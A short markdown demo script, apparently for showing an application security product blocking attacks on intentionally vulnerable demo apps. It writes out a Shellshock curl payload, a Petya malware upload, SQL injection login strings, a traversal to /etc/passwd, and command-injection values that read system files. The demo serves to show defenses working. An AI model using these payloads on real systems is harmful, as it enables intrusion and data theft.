# Application Security

- [Application Security](#application-security)
  - [Demoing w/ Uploader](#demoing-w-uploader)
    - [Shellshock](#shellshock)
    - [Petya](#petya)
  - [Demoing w/ InSekureStore](#demoing-w-insekurestore)
    - [SQL Injection](#sql-injection)
      - [Directory Traversal](#directory-traversal)
      - [Remote Command Execution](#remote-command-execution)

## Demoing w/ Uploader

**Before - Reactivate InSekureStore and Uploader**

### Shellshock

Open a terminal window and paste in the following (ShellShock) exploit:

```shell
curl -H "User-Agent: () { :; }; /bin/eject" http://demoapp3-108-129-65-162.nip.io/
```

*Application Security Protection by `Malicious Payload`*

### Petya

Upload: `Petya.bin`

*Application Security Protection by `Malicious File Upload`*

## Demoing w/ InSekureStore

### SQL Injection

At the login screen

```text
E-Mail: 1'or'1'='1
```

```text
Password: 1'or'1'='1
```

*Application Security Protection by `SQL Injection - Always True`*

#### Directory Traversal

URL

```url
...dev#/browser?view=../../../etc/passwd
```

#### Remote Command Execution

Go to `Mime Type Params` and change to

```text
-b && whoami
```

or

```text
-b && uname -a
```

or

```text
-b && cat ./../../etc/passwd
```

Within the details of a text file you will see the output of your command.

*Application Security Protection by `Remote Command Execution`*
